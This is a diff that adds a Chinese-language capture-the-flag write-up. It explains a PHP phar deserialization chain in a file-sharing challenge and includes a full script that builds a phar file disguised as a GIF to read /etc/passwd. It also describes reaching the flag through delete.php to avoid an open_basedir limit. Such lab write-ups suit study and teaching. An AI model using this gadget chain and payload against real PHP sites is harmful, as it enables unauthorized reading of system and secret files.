@@ -266,3 +266,62 @@ Connection: close
 filename=../../download.php
 ```
 
+主要对`class.php`进行审查,注意到`File::open`中存在`file_exists($filename)`,`file_exists`可以造成`phar`反序列化
+
+1. `File::close`可以进行文件读取
+2. `User::__destruct`执行了`$this->db->close();`,而`FileList::__call`会在`FileList`被调用一个不存在的函数时调用,而`User::__destruct`中的`$this->db->close();`恰好满足了这一步骤
+3. 假设`User->db`执行`File`,则可以进行文件读取,但是除了读取文件外还需要进行文件内容的输出
+4. `FileList::__destruct`会进行输出
+
+```php
+public function __call($func, $args) {//User::__destruct->FileList::__call,$func=close
+	array_push($this->funcs, $func);
+	foreach ($this->files as $file) {
+		$this->results[$file->name()][$func] = $file->$func();//$file=File $func=close $file->$func()=File::close=file_get_contents
+	}
+}
+```
+
+可以构造payload生成phar文件
+
+```php
+<?php
+    class User{
+        public $db;
+    }
+    class FileList{
+        private $files=array();
+        private $results=array();
+        private $funcs=array();
+        public function __construct($class){
+            $this->files[]=$class;
+        }
+    }
+    class File{
+        public $filename='/etc/passwd';
+    }
+    $user=new User();
+    $file=new File();
+    $filelist=new FileList($file);
+    $user->db=$filelist;
+    var_dump($user);
+
+    @unlink("asdf.phar");
+    $phar=new Phar("asdf.phar");//后缀名必须为phar
+    $phar->startBuffering();
+    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");//设置文件头
+    $phar->setMetadata($user);
+    $phar->addFromString("test.txt","asdfghjkl");
+    $phar->stopBuffering();
+    @system("mv asdf.phar asdf.gif");
+?>
+```
+
+![image-20210502000820761](image-20210502000820761.png)
+
+注意到在`download.php`中存在`open_basedir`限制`ini_set("open_basedir", getcwd() . ":/etc:/tmp");`,而在`delete.php`中并无此限制,因此利用`delete.php`来进行phar反序列化
+
+> tmlgb,flag在/flag.txt中...
+
+![image-20210502002005139](image-20210502002005139.png)
+
